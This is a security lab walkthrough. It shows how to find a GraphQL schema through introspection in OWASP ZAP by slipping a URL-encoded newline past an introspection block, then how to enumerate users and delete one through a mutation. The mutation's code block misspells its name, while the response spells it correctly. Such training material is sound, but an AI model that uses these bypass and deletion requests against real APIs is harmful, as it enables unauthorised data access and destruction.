# Lab: Finding a hidden GraphQL endpoint [OWASP Zed Attack Proxy]

> NOTE: We already know, that `GET /api` is the GraphQL endpoint for this lab, so we continue from there.

Right-click `GET /` request from __History__ tab and select "Open in Requester Tab", modify the first line of the request to `GET /api?query=query{__typename}` and hit send. Response body should be:

```json
{
  "data": {
    "__typename": "query"
  }
}
```

Now replace `query=query{__typename}` in the request path with the following introspection query:

```
query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

Notice that there is a `%0a`, a URL-encoded newline character after `__schema` to avoid disallowed introspection policies. Click "Send". The server responds with full introspection details. 

> After trying to get the ZAP's GraphQL add-on to work with this to no avail, I figured queries can be manually discerned from the result from introspections and then specific queries built from the data provided. Unfortunately it requires good command of GraphQL so I learned some of it.
> By the end of this I wrote a [primer](primer/README.md) for red teamers on how to use results of introspection to build queries (basically, what to look for and in what order). 
> And after that I figured, I know Python and now GraphQL, why don't I write something that performs introspection, discerns queries from the result of it, then builds them and gives me options to use with either `GET` or `POST` methods. So I [did](https://github.com/gremlin-0x/gql_viper).
> But I will continue this particular document with manual building of queries. 

Notice, that there is a `getUser` query that takes in argument `id` of `type` `Int` and returns `id` and `username` parameters. So we can build the following GraphQL query:

```graphql
query {
  getUser (id: 3) {
    id
    username
  }
}
```

Copy it and go to __Tools__ > __Encode/Decode/Hash...__ and URL encode this query. Paste it after `/api?query=` in the `GET` request. Notice how it returns user `carlos` in the response:

```json
{
  "data": {
    "getUser": {
      "id": 3,
      "username": "carlos"
    }
  }
}
```

Observe in the results of introspection, there is a mutation named `deleteOrganizationUser` that takes in `input` _object_ as an argument and returns _object_ `user`. 

```graphql
mutation {
  deleteOrganizaitonUser (input: { id: 3 }) {
    user {
      id
      username
    }
  }
}
```

Notice, that it successfully deleted the user and solved the lab:

```json
{
  "data": {
    "deleteOrganizationUser": {
      "user": {
        "id": 3,
        "username": "carlos"
      }
    }
  }
}
```
